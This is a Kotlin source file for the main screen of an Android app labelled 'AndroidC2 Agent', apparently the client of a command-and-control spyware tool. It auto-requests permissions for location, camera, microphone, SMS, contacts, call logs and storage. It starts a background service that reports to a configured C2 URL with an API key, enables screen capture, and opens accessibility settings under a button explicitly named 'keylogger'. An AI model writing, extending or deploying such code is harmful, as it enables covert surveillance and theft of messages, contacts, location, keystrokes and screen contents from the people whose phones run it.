package com.outcome.c2

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : Activity() {

    private val PERMS = mutableListOf(
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
    ).apply {
        if (Build.VERSION.SDK_INT >= 33) add(Manifest.permission.POST_NOTIFICATIONS)
    }.toTypedArray()

    private val REQ = 0xC2

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 96, 48, 48)
        }

        val title = TextView(this).apply {
            text = "AndroidC2 Agent"
            textSize = 22f
        }

        val status = TextView(this).apply {
            text = "C2: ${BuildConfig.C2_URL}\nKey: ${BuildConfig.API_KEY}"
            textSize = 13f
            setPadding(0, 32, 0, 32)
        }

        val btnPerm = Button(this).apply {
            text = "1. Grant permissions"
            setOnClickListener {
                ActivityCompat.requestPermissions(this@MainActivity, PERMS, REQ)
            }
        }

        val btnStart = Button(this).apply {
            text = "2. Start service"
            setOnClickListener {
                val i = Intent(this@MainActivity, C2Service::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    startForegroundService(i)
                else
                    startService(i)
                status.text = "Service started.\nC2: ${BuildConfig.C2_URL}"
            }
        }

        val btnStop = Button(this).apply {
            text = "3. Stop service"
            setOnClickListener {
                stopService(Intent(this@MainActivity, C2Service::class.java))
                status.text = "Service stopped."
            }
        }

        val btnProjection = Button(this).apply {
            text = "4. Enable screen capture permission"
            setOnClickListener {
                startActivity(Intent(this@MainActivity, MediaProjectionSetupActivity::class.java))
            }
        }

        val btnAccess = Button(this).apply {
            text = "5. Enable accessibility (keylogger)"
            setOnClickListener {
                startActivity(Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
        }

        layout.addView(title)
        layout.addView(status)
        layout.addView(btnPerm)
        layout.addView(btnStart)
        layout.addView(btnStop)
        layout.addView(btnProjection)
        layout.addView(btnAccess)

        setContentView(layout)

        // Auto-request permissions on first launch
        val missing = PERMS.any {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing) {
            ActivityCompat.requestPermissions(this, PERMS, REQ)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
    }
}
